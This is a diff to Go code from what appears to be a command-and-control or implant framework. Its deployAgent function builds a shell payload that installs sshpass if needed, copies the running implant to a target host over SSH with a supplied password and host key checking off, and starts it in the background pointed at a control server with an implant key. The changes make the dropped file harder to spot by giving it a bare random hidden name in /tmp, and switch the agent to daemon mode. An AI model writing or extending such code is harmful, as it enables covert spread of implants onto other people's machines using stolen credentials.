@@ -232,7 +232,7 @@ func (e *Engine) deployAgent(campID, botID, user, pass, target, port string) {
 
 	payload := fmt.Sprintf(`SELF=$(readlink -f /proc/self/exe 2>/dev/null)
 if [ -z "$SELF" ] || [ ! -f "$SELF" ]; then echo "DEPLOY_FAILED:cannot_locate_binary"; exit 1; fi
-RNAME=".sysmon-$(head -c 4 /dev/urandom | od -A n -t x1 | tr -d ' \n')"
+RNAME=".$(head -c 4 /dev/urandom | od -A n -t x1 | tr -d ' \n')"
 RPATH="/tmp/$RNAME"
 if ! command -v sshpass &>/dev/null; then
   apt-get install -y sshpass 2>/dev/null || yum install -y sshpass 2>/dev/null || true
@@ -241,7 +241,7 @@ if ! command -v sshpass &>/dev/null; then echo "DEPLOY_FAILED:sshpass_not_availa
 echo "[*] Deploying agent to %s@%s:%s"
 sshpass -p '%s' scp -o StrictHostKeyChecking=no -o ConnectTimeout=10 -P %s "$SELF" '%s@%s':$RPATH 2>&1
 if [ $? -ne 0 ]; then echo "DEPLOY_FAILED:scp_error:%s:%s"; exit 1; fi
-sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p %s '%s@%s' "chmod +x $RPATH && nohup $RPATH --server '%s' --implant-key '%s' --interval 10s --jitter 2s >/dev/null 2>&1 & echo AGENT_PID=\$!" 2>&1
+sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p %s '%s@%s' "chmod +x $RPATH && nohup $RPATH --server '%s' --implant-key '%s' --daemon >/dev/null 2>&1 & echo AGENT_PID=\$!" 2>&1
 echo "DEPLOYED:%s@%s:%s:$RPATH"`,
 		user, target, port,
 		pass, port, user, target,
